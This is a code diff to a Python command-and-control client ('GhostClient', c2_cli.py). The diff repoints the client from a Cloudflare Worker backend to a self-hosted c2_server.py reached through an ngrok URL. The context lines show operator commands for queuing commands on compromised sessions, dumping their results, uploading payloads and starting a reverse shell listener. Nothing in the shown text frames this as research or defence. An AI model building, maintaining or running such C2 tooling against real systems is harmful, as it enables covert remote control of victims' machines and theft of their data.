@@ -18,7 +18,7 @@ Commands:
   python c2_cli.py watch [--interval N]     # live-refresh session list
   python c2_cli.py batch <sid> <cmd1>;<cmd2>;...  # queue multiple commands
   python c2_cli.py export <sid> [file]      # dump all results to file
-  python c2_cli.py payload upload <file>    # upload payload to worker
+  python c2_cli.py payload upload <file>    # upload payload to c2 server
   python c2_cli.py listen --port <port>     # start reverse shell listener
   python c2_cli.py config show              # show current config
   python c2_cli.py config set --url <url> --token <tok>  # save config
@@ -148,7 +148,7 @@ def resolve_config(args: argparse.Namespace) -> tuple[str, str, Optional[str]]:
 
     if not url:
         err("No C2 URL configured. Set one of:")
-        err("  --url https://ghost-c2.<account>.workers.dev")
+        err("  --url https://mute-attempt-fossil.ngrok-free.dev")
         err("  GHOST_C2_URL env var")
         err("  python c2_cli.py config set --url <url> --token <tok>")
         sys.exit(1)
@@ -296,7 +296,7 @@ class GhostClient:
         return self._get("/audit", params={"limit": limit})  # type: ignore[return-value]
 
     def upload_payload(self, data: bytes) -> dict:
-        """Upload a raw binary payload to the Worker KV store."""
+        """Upload a raw binary payload to the C2 server."""
         url  = f"{self.base_url}/payload"
         sess = self._session()
         sess.headers["Content-Type"] = "application/octet-stream"
@@ -846,7 +846,7 @@ def _build_parser() -> argparse.ArgumentParser:
     r = sub.add_parser("results", help="Retrieve results for a session")
     r.add_argument("sid")
     r.add_argument("--clear", action="store_true",
-                   help="Delete results from KV after fetching")
+                   help="Delete results after fetching")
     r.add_argument("--all", dest="show_all", action="store_true",
                    help="Show all results (default: latest only)")
     r.add_argument("--json", action="store_true", help="Output as JSON")
@@ -870,7 +870,7 @@ def _build_parser() -> argparse.ArgumentParser:
     w.add_argument("--interval", type=int, default=5)
 
     # payload
-    pl = sub.add_parser("payload", help="Upload payload to Worker KV")
+    pl = sub.add_parser("payload", help="Upload payload to C2 server")
     pl.add_argument("action", choices=["upload"])
     pl.add_argument("filepath", nargs="?", default=None)
 
@@ -986,7 +986,7 @@ def main() -> None:
 
     except requests.exceptions.ConnectionError:
         err(f"Cannot connect to {url}")
-        err("Verify: wrangler dev is running, or the Worker is deployed.")
+        err("Verify: c2_server.py is running and ngrok is forwarding to it.")
         sys.exit(1)
     except requests.exceptions.HTTPError as e:
         err(f"HTTP {e.response.status_code}: {e.response.text[:200]}")
